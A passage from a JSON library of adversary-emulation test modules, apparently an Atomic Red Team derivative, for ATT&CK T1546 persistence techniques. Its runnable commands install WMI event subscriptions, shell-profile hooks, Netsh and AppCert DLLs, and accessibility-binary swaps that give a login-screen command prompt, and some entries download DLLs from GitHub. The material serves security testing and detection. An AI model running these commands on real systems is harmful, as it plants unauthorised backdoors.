$FilterToConsumerArgs\n",
        "elevation_required": true,
        "cleanup_command": "$EventConsumerToCleanup = Get-WmiObject -Namespace root/subscription -Class ActiveScriptEventConsumer -Filter \"Name = 'RAGLOXRedTeam-WMIPersistence-ActiveScriptEventConsumer-Example'\"\n$EventFilterToCleanup = Get-WmiObject -Namespace root/subscription -Class __EventFilter -Filter \"Name = 'RAGLOXRedTeam-WMIPersistence-ActiveScriptEventConsumer-Example'\"\n$FilterConsumerBindingToCleanup = Get-WmiObject -Namespace root/subscription -Query \"REFERENCES OF {$($EventConsumerToCleanup.__RELPATH)} WHERE ResultClass = __FilterToConsumerBinding\" -ErrorAction SilentlyContinue\n$FilterConsumerBindingToCleanup | Remove-WmiObject\n$EventConsumerToCleanup | Remove-WmiObject\n$EventFilterToCleanup | Remove-WmiObject\n"
      },
      "variables": [],
      "prerequisites": [],
      "rx_module_id": "fecd0dfd-fb55-45fa-a10b-6250272d0832",
      "module_name": "Persistence via WMI Event Subscription - ActiveScriptEventConsumer"
    },
    {
      "index": 1228,
      "technique_id": "T1546.003",
      "technique_name": "Event Triggered Execution: Windows Management Instrumentation Event Subscription",
      "description": "The following RAGLOX will utilize MOFComp.exe to load a local MOF file.\nThe Managed Object Format (MOF) compiler parses a file containing MOF statements and adds the classes and class instances defined in the file to the WMI repository. \nTo query for the class:  gwmi __eventfilter -namespace root\\subscription\nA successful execution will add the class to WMI root namespace.\nReference: https://pentestlab.blog/2020/01/21/persistence-wmi-event-subscription/ and https://thedfirreport.com/2022/07/11/select-xmrig-from-sqlserver/.\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "powershell",
        "command": "#{mofcomp_path} \"#{mof_file}\"\n",
        "elevation_required": false,
        "cleanup_command": "$EventConsumerToCleanup = Get-WmiObject -Namespace root/subscription -Class CommandLineEventConsumer -Filter \"Name = 'RAGLOXRedTeam_consumer'\"\n$EventFilterToCleanup = Get-WmiObject -Namespace root/subscription -Class __EventFilter -Filter \"Name = 'RAGLOXRedTeam_filter'\"\n$FilterConsumerBindingToCleanup = Get-WmiObject -Namespace root/subscription -Query \"REFERENCES OF {$($EventConsumerToCleanup.__RELPATH)} WHERE ResultClass = __FilterToConsumerBinding\" -ErrorAction SilentlyContinue\n$FilterConsumerBindingToCleanup | Remove-WmiObject\n$EventConsumerToCleanup | Remove-WmiObject\n$EventFilterToCleanup | Remove-WmiObject\n"
      },
      "variables": [
        {
          "name": "mofcomp_path",
          "description": "Location of mofcomp.exe",
          "type": "string",
          "default_value": "c:\\windows\\system32\\wbem\\mofcomp.exe"
        },
        {
          "name": "mof_file",
          "description": "Local location MOF file",
          "type": "string",
          "default_value": "PathToRagloxModulesFolder\\T1546.003\\src\\T1546.003.mof"
        }
      ],
      "prerequisites": [
        {
          "description": "MofComp.exe must exist on disk at specified location (#{mofcomp_path})\n",
          "check_command": "if (Test-Path \"#{mofcomp_path}\") { exit 0} else { exit 1}\n",
          "install_command": "Validate MOFComp.exe is on disk somewhere and update input argument.\n"
        },
        {
          "description": "MofComp.exe must exist on disk at specified location (#{mof_file})\n",
          "check_command": "if (Test-Path \"#{mof_file}\") { exit 0} else { exit 1}\n",
          "install_command": "New-Item -Type Directory (split-path \"#{mof_file}\") -ErrorAction ignore | Out-Null\nInvoke-WebRequest \"https://github.com/redcanaryco/raglox-red-team/raw/master/rx_modules/T1546.003/src/T1546.003.mof\" -OutFile \"#{mof_file}\"\n"
        }
      ],
      "rx_module_id": "29786d7e-8916-4de6-9c55-be7b093b2706",
      "module_name": "Windows MOFComp.exe Load MOF File"
    },
    {
      "index": 1229,
      "technique_id": "T1546.004",
      "technique_name": "Event Triggered Execution: .bash_profile .bashrc and .shrc",
      "description": "Adds a command to the .bash_profile file of the current user\n",
      "execution": {
        "platforms": [
          "macos",
          "linux"
        ],
        "executor_type": "sh",
        "command": "echo '#{command_to_add}' >> ~/.bash_profile\n",
        "elevation_required": false,
        "cleanup_command": "head -n '-2' ~/.bash_profile > /tmp/T1546.004\nmv /tmp/T1546.004 ~/.bash_profile\n"
      },
      "variables": [
        {
          "name": "command_to_add",
          "description": "Command to add to the .bash_profile file",
          "type": "string",
          "default_value": "echo \"Hello from RAGLOX Threat Library T1546.004\" > /tmp/T1546.004"
        }
      ],
      "prerequisites": [],
      "rx_module_id": "94500ae1-7e31-47e3-886b-c328da46872f",
      "module_name": "Add command to .bash_profile"
    },
    {
      "index": 1230,
      "technique_id": "T1546.004",
      "technique_name": "Event Triggered Execution: .bash_profile .bashrc and .shrc",
      "description": "Adds a command to the .bashrc file of the current user\n",
      "execution": {
        "platforms": [
          "macos",
          "linux"
        ],
        "executor_type": "sh",
        "command": "echo '#{command_to_add}' >> ~/.bashrc\n",
        "elevation_required": false,
        "cleanup_command": "head -n '-2' ~/.bashrc > /tmp/T1546.004\nmv /tmp/T1546.004 ~/.bashrc\n"
      },
      "variables": [
        {
          "name": "command_to_add",
          "description": "Command to add to the .bashrc file",
          "type": "string",
          "default_value": "echo \"Hello from RAGLOX Threat Library T1546.004\" > /tmp/T1546.004"
        }
      ],
      "prerequisites": [],
      "rx_module_id": "0a898315-4cfa-4007-bafe-33a4646d115f",
      "module_name": "Add command to .bashrc"
    },
    {
      "index": 1231,
      "technique_id": "T1546.004",
      "technique_name": "Event Triggered Execution: .bash_profile .bashrc and .shrc",
      "description": "Adds a command to the .shrc file of the current user\n",
      "execution": {
        "platforms": [
          "linux"
        ],
        "executor_type": "sh",
        "command": "echo '#{command_to_add}' >> ~/.shrc\n",
        "elevation_required": false,
        "cleanup_command": "head -n '-2' ~/.shrc > /tmp/T1546.004\nmv /tmp/T1546.004 ~/.shrc\n"
      },
      "variables": [
        {
          "name": "command_to_add",
          "description": "Command to add to the .shrc file",
          "type": "string",
          "default_value": "echo \"Hello from RAGLOX Threat Library T1546.004\" > /tmp/T1546.004"
        }
      ],
      "prerequisites": [],
      "rx_module_id": "41502021-591a-4649-8b6e-83c9192aff53",
      "module_name": "Add command to .shrc"
    },
    {
      "index": 1232,
      "technique_id": "T1546.004",
      "technique_name": "Event Triggered Execution: .bash_profile .bashrc and .shrc",
      "description": "An adversary may wish to establish persistence by executing malicious commands from the systems /etc/profile every time \"any\" user logs in.\n",
      "execution": {
        "platforms": [
          "linux"
        ],
        "executor_type": "sh",
        "command": "echo '#{text_to_append}' >> /etc/profile\n",
        "elevation_required": true,
        "cleanup_command": "sed -i \"s/# RAGLOX Threat Library was here! T1546.004//\" /etc/profile\n"
      },
      "variables": [
        {
          "name": "text_to_append",
          "description": "Text to append to the /etc/profile file",
          "type": "string",
          "default_value": "# Hello from RAGLOX Threat Library T1546.004"
        }
      ],
      "prerequisites": [],
      "rx_module_id": "694b3cc8-6a78-4d35-9e74-0123d009e94b",
      "module_name": "Append to the system shell profile"
    },
    {
      "index": 1233,
      "technique_id": "T1546.004",
      "technique_name": "Event Triggered Execution: .bash_profile .bashrc and .shrc",
      "description": "An adversary may wish to establish persistence by executing malicious commands from the users ~/.profile every time the \"user\" logs in.\n",
      "execution": {
        "platforms": [
          "linux"
        ],
        "executor_type": "sh",
        "command": "echo '#{text_to_append}' >> ~/.profile\n",
        "elevation_required": false,
        "cleanup_command": "sed -i \"s/# RAGLOX Threat Library was here... T1546.004//\" ~/.profile\n"
      },
      "variables": [
        {
          "name": "text_to_append",
          "description": "Text to append to the ~/.profile file",
          "type": "string",
          "default_value": "# RAGLOX Threat Library was here... T1546.004"
        }
      ],
      "prerequisites": [],
      "rx_module_id": "bbdb06bc-bab6-4f5b-8232-ba3fbed51d77",
      "module_name": "Append commands user shell profile"
    },
    {
      "index": 1234,
      "technique_id": "T1546.004",
      "technique_name": "Event Triggered Execution: .bash_profile .bashrc and .shrc",
      "description": "An adversary may wish to establish persistence by adding commands into any of the script files in the /etc/profile.d/ directory, which are executed every time \"any\" user logs in.\n",
      "execution": {
        "platforms": [
          "linux"
        ],
        "executor_type": "sh",
        "command": "echo '#{text_to_append}' >> /etc/profile.d/bash_completion.sh\n",
        "elevation_required": true,
        "cleanup_command": "sed -i \"s/# RAGLOX Threat Library was here... T1546.004//\" /etc/profile.d/bash_completion.sh\n"
      },
      "variables": [
        {
          "name": "text_to_append",
          "description": "Text to append to the /etc/profile.d/bash_completion.sh file",
          "type": "string",
          "default_value": "# RAGLOX Threat Library was here... T1546.004"
        }
      ],
      "prerequisites": [],
      "rx_module_id": "8fe2ccfd-f079-4c03-b1a9-bd9b362b67d4",
      "module_name": "System shell profile scripts"
    },
    {
      "index": 1235,
      "technique_id": "T1546.004",
      "technique_name": "Event Triggered Execution: .bash_profile .bashrc and .shrc",
      "description": "The Bash shell runs ~/.bash_logout \"if it exists\" to run commands on user logout. An adversary may create or append to a .bash_logout to clear history, start processes etc. Note the ~/.bash_logout is only run if you explicitly exit or log out of an \"interactive login shell session\" i.e. via the console, SSH, /bin/bash -l or su -l <username>. \n\nThis test creates the art user, logs in, creates a .bash_logout which will echo some text into the art.txt file on logout and logs out and the /home/art/art.txt is created.\n",
      "execution": {
        "platforms": [
          "linux"
        ],
        "executor_type": "bash",
        "command": "useradd --create-home --shell /bin/bash art\nsu -l art -c \"echo 'echo \\\"RAGLOX Threat Library was here... T1546.004\\\" >> /home/art/art.txt' >> /home/art/.bash_logout; exit\"\n",
        "elevation_required": true,
        "cleanup_command": "userdel -fr art\n"
      },
      "variables": [],
      "prerequisites": [],
      "rx_module_id": "37ad2f24-7c53-4a50-92da-427a4ad13f58",
      "module_name": "Create/Append to .bash_logout"
    },
    {
      "index": 1236,
      "technique_id": "T1546.005",
      "technique_name": "Event Triggered Execution: Trap",
      "description": "Launch bash shell with command arg to create TRAP on EXIT.\nThe trap executes script that writes to /tmp/art-fish.txt\n",
      "execution": {
        "platforms": [
          "macos",
          "linux"
        ],
        "executor_type": "sh",
        "command": "bash -c 'trap \"nohup sh $PathToRagloxModulesFolder/T1546.005/src/echo-art-fish.sh\" EXIT'\n",
        "elevation_required": false,
        "cleanup_command": "rm -f /tmp/art-fish.txt\n"
      },
      "variables": [],
      "prerequisites": [],
      "rx_module_id": "a74b2e07-5952-4c03-8b56-56274b076b61",
      "module_name": "Trap EXIT"
    },
    {
      "index": 1237,
      "technique_id": "T1546.005",
      "technique_name": "Event Triggered Execution: Trap",
      "description": "Launch bash shell with command arg to create TRAP on EXIT.\nThe trap executes script that writes to /tmp/art-fish.txt\n",
      "execution": {
        "platforms": [
          "linux"
        ],
        "executor_type": "sh",
        "command": "bash -c 'trap \"nohup sh $PathToRagloxModulesFolder/T1546.005/src/echo-art-fish.sh\" EXIT'\n",
        "elevation_required": false,
        "cleanup_command": "rm -f /tmp/art-fish.txt\n"
      },
      "variables": [],
      "prerequisites": [
        {
          "description": "Check if bash is installed.\n",
          "check_command": "if [ ! -x \"$(command -v bash)\" ]; then exit 1; else exit 0; fi;\n",
          "install_command": "(which pkg && pkg install -y bash)\n"
        }
      ],
      "rx_module_id": "be1a5d70-6865-44aa-ab50-42244c9fd16f",
      "module_name": "Trap EXIT (freebsd)"
    },
    {
      "index": 1238,
      "technique_id": "T1546.005",
      "technique_name": "Event Triggered Execution: Trap",
      "description": "Launch bash shell with command arg to create TRAP on SIGINT (CTRL+C), then send SIGINT signal.\nThe trap executes script that writes to /tmp/art-fish.txt\n",
      "execution": {
        "platforms": [
          "macos",
          "linux"
        ],
        "executor_type": "sh",
        "command": "bash -c 'trap \"nohup sh $PathToRagloxModulesFolder/T1546.005/src/echo-art-fish.sh\" SIGINT && kill -SIGINT $$'\n",
        "elevation_required": false,
        "cleanup_command": "rm -f /tmp/art-fish.txt\n"
      },
      "variables": [],
      "prerequisites": [],
      "rx_module_id": "a547d1ba-1d7a-4cc5-a9cb-8d65e8809636",
      "module_name": "Trap SIGINT"
    },
    {
      "index": 1239,
      "technique_id": "T1546.005",
      "technique_name": "Event Triggered Execution: Trap",
      "description": "Launch bash shell with command arg to create TRAP on SIGINT (CTRL+C), then send SIGINT signal.\nThe trap executes script that writes to /tmp/art-fish.txt\n",
      "execution": {
        "platforms": [
          "linux"
        ],
        "executor_type": "sh",
        "command": "bash -c 'trap \"nohup sh $PathToRagloxModulesFolder/T1546.005/src/echo-art-fish.sh\" SIGINT && kill -SIGINT $$'\n",
        "elevation_required": false,
        "cleanup_command": "rm -f /tmp/art-fish.txt\n"
      },
      "variables": [],
      "prerequisites": [
        {
          "description": "Check if bash is installed.\n",
          "check_command": "if [ ! -x \"$(command -v bash)\" ]; then exit 1; else exit 0; fi;\n",
          "install_command": "(which pkg && pkg install -y bash)\n"
        }
      ],
      "rx_module_id": "ade10242-1eac-43df-8412-be0d4c704ada",
      "module_name": "Trap SIGINT (freebsd)"
    },
    {
      "index": 1240,
      "technique_id": "T1546.007",
      "technique_name": "Event Triggered Execution: Netsh Helper DLL",
      "description": "You can register a \"helper dll\" with Netsh as a persistance mechanism. The code in the dll is executed every time netsh.exe is called.\nThe NetshHelper.dll provided with the raglox will simply launch notepad when netsh.exe is run.\n\n[Blog](https://htmlpreview.github.io/?https://github.com/MatthewDemaske/blogbackup/blob/master/netshell.html)\n[Sample DLL code](https://github.com/outflanknl/NetshHelperBeacon)\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "command_prompt",
        "command": "netsh.exe add helper \"#{helper_file}\"\ntaskkill /im notepad.exe /t /f > NUL 2>&1\n",
        "elevation_required": true,
        "cleanup_command": "netsh.exe delete helper \"#{helper_file}\"\n"
      },
      "variables": [
        {
          "name": "helper_file",
          "description": "Path to DLL",
          "type": "path",
          "default_value": "PathToRagloxModulesFolder\\T1546.007\\bin\\NetshHelper.dll"
        }
      ],
      "prerequisites": [
        {
          "description": "Helper DLL must exist on disk at specified location (#{helper_file})\n",
          "check_command": "if (Test-Path \"#{helper_file}\") { exit 0} else { exit 1}\n",
          "install_command": "New-Item -Type Directory (split-path \"#{helper_file}\") -ErrorAction ignore | Out-Null\nInvoke-WebRequest \"https://github.com/redcanaryco/raglox-red-team/raw/master/rx_modules/T1546.007/bin/NetshHelper.dll\" -OutFile \"#{helper_file}\"\n"
        }
      ],
      "rx_module_id": "3244697d-5a3a-4dfc-941c-550f69f91a4d",
      "module_name": "Netsh Helper DLL Registration"
    },
    {
      "index": 1241,
      "technique_id": "T1546.008",
      "technique_name": "Event Triggered Execution: Accessibility Features",
      "description": "Attaches cmd.exe to a list of processes. Configure your own Input arguments to a different executable or list of executables.\nUpon successful execution, powershell will modify the registry and swap osk.exe with cmd.exe.\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "powershell",
        "command": "$input_table = \"#{parent_list}\".split(\",\")\n$Name = \"Debugger\"\n$Value = \"#{attached_process}\"\nForeach ($item in $input_table){\n  $item = $item.trim()\n  $registryPath = \"HKLM:\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\$item\"\n  IF(!(Test-Path $registryPath))\n  {\n    New-Item -Path $registryPath -Force\n    New-ItemProperty -Path $registryPath -Name $name -Value $Value -PropertyType STRING -Force\n  }\n  ELSE\n  {\n    New-ItemProperty -Path $registryPath -Name $name -Value $Value\n  }\n}\n",
        "elevation_required": true,
        "cleanup_command": "$input_table = \"#{parent_list}\".split(\",\")\nForeach ($item in $input_table)\n{\n  $item = $item.trim()\n  reg delete \"HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\$item\" /v Debugger /f 2>&1 | Out-Null\n}\n"
      },
      "variables": [
        {
          "name": "parent_list",
          "description": "Comma separated list of system binaries to which you want to attach each #{attached_process}. Default: \"osk.exe\"\n",
          "type": "string",
          "default_value": "osk.exe, sethc.exe, utilman.exe, magnify.exe, narrator.exe, DisplaySwitch.exe, atbroker.exe"
        },
        {
          "name": "attached_process",
          "description": "Full path to process to attach to target in #{parent_list}. Default: cmd.exe\n",
          "type": "path",
          "default_value": "C:\\windows\\system32\\cmd.exe"
        }
      ],
      "prerequisites": [],
      "rx_module_id": "3309f53e-b22b-4eb6-8fd2-a6cf58b355a9",
      "module_name": "Attaches Command Prompt as a Debugger to a List of Target Processes"
    },
    {
      "index": 1242,
      "technique_id": "T1546.008",
      "technique_name": "Event Triggered Execution: Accessibility Features",
      "description": "Replace sticky keys binary (sethc.exe) with cmd.exe\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "command_prompt",
        "command": "IF NOT EXIST C:\\Windows\\System32\\sethc_backup.exe (copy C:\\Windows\\System32\\sethc.exe C:\\Windows\\System32\\sethc_backup.exe) ELSE ( pushd )\ntakeown /F C:\\Windows\\System32\\sethc.exe /A\nicacls C:\\Windows\\System32\\sethc.exe /grant Administrators:F /t\ncopy /Y C:\\Windows\\System32\\cmd.exe C:\\Windows\\System32\\sethc.exe\n",
        "elevation_required": true,
        "cleanup_command": "copy /Y C:\\Windows\\System32\\sethc_backup.exe C:\\Windows\\System32\\sethc.exe\n"
      },
      "variables": [],
      "prerequisites": [],
      "rx_module_id": "934e90cf-29ca-48b3-863c-411737ad44e3",
      "module_name": "Replace binary of sticky keys"
    },
    {
      "index": 1243,
      "technique_id": "T1546.008",
      "technique_name": "Event Triggered Execution: Accessibility Features",
      "description": "Replace accessiblity executable with cmd.exe to provide elevated command prompt from login screen without logging in.\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "command_prompt",
        "command": "IF NOT EXIST %windir%\\System32\\osk.exe.bak (copy %windir%\\System32\\osk.exe %windir%\\System32\\osk.exe.bak) ELSE ( pushd )\ntakeown /F %windir%\\System32\\osk.exe /A\nicacls %windir%\\System32\\osk.exe /grant Administrators:F /t\ndel %windir%\\System32\\osk.exe\nmklink %windir%\\System32\\osk.exe %windir%\\System32\\cmd.exe\n",
        "elevation_required": true,
        "cleanup_command": "takeown /F %windir%\\System32\\osk.exe /A\nicacls %windir%\\System32\\osk.exe /grant Administrators:F /t\ndel %windir%\\System32\\osk.exe\ncopy /Y %windir%\\System32\\osk.exe.bak %windir%\\System32\\osk.exe\nicacls %windir%\\system32\\osk.exe /inheritance:d\nicacls %windir%\\system32\\osk.exe /setowner \"NT SERVICE\\TrustedInstaller\"\nicacls %windir%\\System32\\osk.exe /grant \"NT SERVICE\\TrustedInstaller\":F /t\nicacls %windir%\\system32\\osk.exe /grant:r SYSTEM:RX\nicacls %windir%\\system32\\osk.exe /grant:r Administrators:RX\n"
      },
      "variables": [],
      "prerequisites": [],
      "rx_module_id": "51ef369c-5e87-4f33-88cd-6d61be63edf2",
      "module_name": "Create Symbolic Link From osk.exe to cmd.exe"
    },
    {
      "index": 1244,
      "technique_id": "T1546.008",
      "technique_name": "Event Triggered Execution: Accessibility Features",
      "description": "Executes code specified in the registry for a new AT (Assistive Technologies).\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "command_prompt",
        "command": "reg add \"HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Accessibility\\ATs\\malware_test\" /f\nreg add \"HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Accessibility\\ATs\\malware_test\" /v TerminateOnDesktopSwitch /t REG_DWORD /d 0 /f\nreg add \"HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Accessibility\\ATs\\malware_test\" /v StartEXE /t REG_SZ /d C:\\WINDOWS\\system32\\cmd.exe /f\natbroker /start malware_test\n",
        "elevation_required": true,
        "cleanup_command": "reg delete \"HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Accessibility\\ATs\\malware_test\" /f\n"
      },
      "variables": [],
      "prerequisites": [],
      "rx_module_id": "444ff124-4c83-4e28-8df6-6efd3ece6bd4",
      "module_name": "Atbroker.exe (AT) Executes Arbitrary Command via Registry Key"
    },
    {
      "index": 1245,
      "technique_id": "T1546.008",
      "technique_name": "Event Triggered Execution: Accessibility Features",
      "description": "Executes code specified in the registry on new user logon session automatically by registration of new AT and modification of configuration value.\nThis test will register new AT named malware_test with code for cmd.exe and add a configuration value for the code to be run during user logon session.\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "command_prompt",
        "command": "reg add \"HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Accessibility\\ATs\\malware_test\" /f\nreg add \"HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Accessibility\\ATs\\malware_test\" /v TerminateOnDesktopSwitch /t REG_DWORD /d 0 /f\nreg add \"HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Accessibility\\ATs\\malware_test\" /v StartEXE /t REG_SZ /d C:\\WINDOWS\\system32\\cmd.exe /f\nreg add \"HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Accessibility\\ATs\" /v Configuration /t REG_SZ /d malware_test /f\n",
        "elevation_required": true,
        "cleanup_command": "reg delete \"HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Accessibility\\ATs\\malware_test\" /f\nreg delete \"HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Accessibility\\ATs\" /v Configuration /f\n"
      },
      "variables": [],
      "prerequisites": [],
      "rx_module_id": "7125eba8-7b30-426b-9147-781d152be6fb",
      "module_name": "Auto-start application on user logon"
    },
    {
      "index": 1246,
      "technique_id": "T1546.008",
      "technique_name": "Event Triggered Execution: Accessibility Features",
      "description": "Replace utilman.exe (Ease of Access binary) with cmd.exe. This allows the user to launch an elevated command prompt by clicking the Ease of Access button on the login screen.\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "command_prompt",
        "command": "IF NOT EXIST C:\\Windows\\System32\\utilman_backup.exe (copy C:\\Windows\\System32\\utilman.exe C:\\Windows\\System32\\utilman_backup.exe) ELSE ( pushd )\ntakeown /F C:\\Windows\\System32\\utilman.exe /A\nicacls C:\\Windows\\System32\\utilman.exe /grant Administrators:F /t\ncopy /Y C:\\Windows\\System32\\cmd.exe C:\\Windows\\System32\\utilman.exe\n",
        "elevation_required": true,
        "cleanup_command": "copy /Y C:\\Windows\\System32\\utilman_backup.exe C:\\Windows\\System32\\utilman.exe\n"
      },
      "variables": [],
      "prerequisites": [],
      "rx_module_id": "1db380da-3422-481d-a3c8-6d5770dba580",
      "module_name": "Replace utilman.exe (Ease of Access Binary) with cmd.exe"
    },
    {
      "index": 1247,
      "technique_id": "T1546.008",
      "technique_name": "Event Triggered Execution: Accessibility Features",
      "description": "Replace Magnify.exe (Magnifier binary) with cmd.exe. This allows the user to launch an elevated command prompt by toggling on the Magnifier from the Accessibility menu on the login screen.\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "command_prompt",
        "command": "IF NOT EXIST C:\\Windows\\System32\\Magnify_backup.exe (copy C:\\Windows\\System32\\Magnify.exe C:\\Windows\\System32\\Magnify_backup.exe) ELSE ( pushd )\ntakeown /F C:\\Windows\\System32\\Magnify.exe /A\nicacls C:\\Windows\\System32\\Magnify.exe /grant Administrators:F /t\ncopy /Y C:\\Windows\\System32\\cmd.exe C:\\Windows\\System32\\Magnify.exe\n",
        "elevation_required": true,
        "cleanup_command": "copy /Y C:\\Windows\\System32\\Magnify_backup.exe C:\\Windows\\System32\\Magnify.exe\n"
      },
      "variables": [],
      "prerequisites": [],
      "rx_module_id": "5e4fa70d-c789-470e-85e1-6992b92bb321",
      "module_name": "Replace Magnify.exe (Magnifier binary) with cmd.exe"
    },
    {
      "index": 1248,
      "technique_id": "T1546.008",
      "technique_name": "Event Triggered Execution: Accessibility Features",
      "description": "Replace Narrator.exe (Narrator binary) with cmd.exe. This allows the user to launch an elevated command prompt by toggling on the Narrator button from the Accessibility menu on the login screen.\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "command_prompt",
        "command": "IF NOT EXIST C:\\Windows\\System32\\Narrator_backup.exe (copy C:\\Windows\\System32\\Narrator.exe C:\\Windows\\System32\\Narrator_backup.exe) ELSE ( pushd )\ntakeown /F C:\\Windows\\System32\\Narrator.exe /A\nicacls C:\\Windows\\System32\\Narrator.exe /grant Administrators:F /t\ncopy /Y C:\\Windows\\System32\\cmd.exe C:\\Windows\\System32\\Narrator.exe\n",
        "elevation_required": true,
        "cleanup_command": "copy /Y C:\\Windows\\System32\\Narrator_backup.exe C:\\Windows\\System32\\Narrator.exe\n"
      },
      "variables": [],
      "prerequisites": [],
      "rx_module_id": "2002f5ea-cd13-4c82-bf73-e46722e5dc5e",
      "module_name": "Replace Narrator.exe (Narrator binary) with cmd.exe"
    },
    {
      "index": 1249,
      "technique_id": "T1546.008",
      "technique_name": "Event Triggered Execution: Accessibility Features",
      "description": "Replace DisplaySwitch.exe (Display Switcher binary) with cmd.exe. This allows the user to launch an elevated command prompt by pressing the Windows Key + P on the login screen.\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "command_prompt",
        "command": "IF NOT EXIST C:\\Windows\\System32\\DisplaySwitch_backup.exe (copy C:\\Windows\\System32\\DisplaySwitch.exe C:\\Windows\\System32\\DisplaySwitch_backup.exe) ELSE ( pushd )\ntakeown /F C:\\Windows\\System32\\DisplaySwitch.exe /A\nicacls C:\\Windows\\System32\\DisplaySwitch.exe /grant Administrators:F /t\ncopy /Y C:\\Windows\\System32\\cmd.exe C:\\Windows\\System32\\DisplaySwitch.exe\n",
        "elevation_required": true,
        "cleanup_command": "copy /Y C:\\Windows\\System32\\DisplaySwitch_backup.exe C:\\Windows\\System32\\DisplaySwitch.exe\n"
      },
      "variables": [],
      "prerequisites": [],
      "rx_module_id": "825ba8ca-71cc-436b-b1dd-ea0d5e109086",
      "module_name": "Replace DisplaySwitch.exe (Display Switcher binary) with cmd.exe"
    },
    {
      "index": 1250,
      "technique_id": "T1546.008",
      "technique_name": "Event Triggered Execution: Accessibility Features",
      "description": "Replace AtBroker.exe (App Switcher binary) with cmd.exe. This allows the user to launch an elevated command prompt from the login screen by locking and then unlocking the computer after toggling on any of the accessibility tools in the Accessibility menu.\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "command_prompt",
        "command": "IF NOT EXIST C:\\Windows\\System32\\AtBroker_backup.exe (copy C:\\Windows\\System32\\AtBroker.exe C:\\Windows\\System32\\AtBroker_backup.exe) ELSE ( pushd )\ntakeown /F C:\\Windows\\System32\\AtBroker.exe /A\nicacls C:\\Windows\\System32\\AtBroker.exe /grant Administrators:F /t\ncopy /Y C:\\Windows\\System32\\cmd.exe C:\\Windows\\System32\\AtBroker.exe\n",
        "elevation_required": true,
        "cleanup_command": "copy /Y C:\\Windows\\System32\\AtBroker_backup.exe C:\\Windows\\System32\\AtBroker.exe\n"
      },
      "variables": [],
      "prerequisites": [],
      "rx_module_id": "210be7ea-d841-40ec-b3e1-ff610bb62744",
      "module_name": "Replace AtBroker.exe (App Switcher binary) with cmd.exe"
    },
    {
      "index": 1251,
      "technique_id": "T1546.009",
      "technique_name": "Event Triggered Execution: AppCert DLLs",
      "description": "Creates a new 'RAGLOXTest' value pointing to an AppCert DLL in the AppCertDlls registry key. \nOnce the computer restarted, the DLL will be loaded in multiple processes and write an \n'RAGLOXTest.txt' file in C:\\Users\\Public\\ to validate that the DLL executed succesfully.\n\nReference: https://skanthak.homepage.t-online.de/appcert.html\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "powershell",
        "command": "Copy-Item \"#{dll_path}\" C:\\Users\\Public\\RAGLOXTest.dll -Force\nreg add \"HKEY_LOCAL_MACHINE\\System\\CurrentControlSet\\Control\\Session Manager\\AppCertDlls\" /v \"RAGLOXTest\" /t REG_EXPAND_SZ /d \"C:\\Users\\Public\\RAGLOXTest.dll\" /f\nif(#{reboot}){Restart-Computer} \n",
        "elevation_required": true,
        "cleanup_command": "reg delete \"HKEY_LOCAL_MACHINE\\System\\CurrentControlSet\\Control\\Session Manager\\AppCertDlls\" /v \"RAGLOXTest\" /f\nRemove-Item C:\\Users\\Public\\RAGLOXTest.dll -Force\nRemove-Item C:\\Users\\Public\\RAGLOXTest.txt -Force\n"
      },
      "variables": [
        {
          "name": "dll_path",
          "description": "path of dll to use",
          "type": "path",
          "default_value": "PathToRagloxModulesFolder\\T1546.009\\bin\\RAGLOXTest.dll"
        },
        {
          "name": "reboot",
          "description": "Set value to $true if you want to automatically reboot the machine",
          "type": "string",
          "default_value": "$false"
        }
      ],
      "prerequisites": [
        {
          "description": "File to copy must exist on disk at specified location (#{dll_path})\n",
          "check_command": "if (Test-Path \"#{dll_path}\") {exit 0} else {exit 1}\n",
          "install_command": "New-Item -Type Directory (split-path \"#{dll_path}\") -ErrorAction ignore | Out-Null\nInvoke-WebRequest \"https://github.com/redcanaryco/raglox-red-team/raw/master/rx_modules/T1546.009/bin/RAGLOXTest.dll\" -OutFile \"#{dll_path}\"\n"
        }
      ],
      "rx_module_id": "a5ad6104-5bab-4c43-b295-b4c44c7c6b05",
      "module_name": "Create registry persistence via AppCert DLL"
    },
    {
      "index": 1252,
      "technique_id": "T1546.010",
      "technique_name": "Event Triggered Execution: AppInit DLLs",
      "description": "AppInit_DLLs is a mechanism that allows an arbitrary list of DLLs to be loaded into each user mode process on the system. Upon succesfully execution, \nyou will see the message \"The operation completed successfully.\" Each time the DLL is loaded, you will see a message box with a message of \"Install AppInit Shim DLL was called!\" appear.\nThis will happen regularly as your computer starts up various applications and may in fact drive you crazy. A reliable way to make the message box appear and verify the \nAppInit Dlls are loading is to start the notepad application. Be sure to run the cleanup commands afterwards so you don't keep getting message boxes showing up.\n\nNote: If secure boot is enabled, this technique will not work. https://docs.microsoft.com/en-us/windows/win32/dlls/secure-boot-and-appinit-dlls\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "command_prompt",
        "command": "reg.exe import \"#{registry_file}\"\n",
        "elevation_required": true,
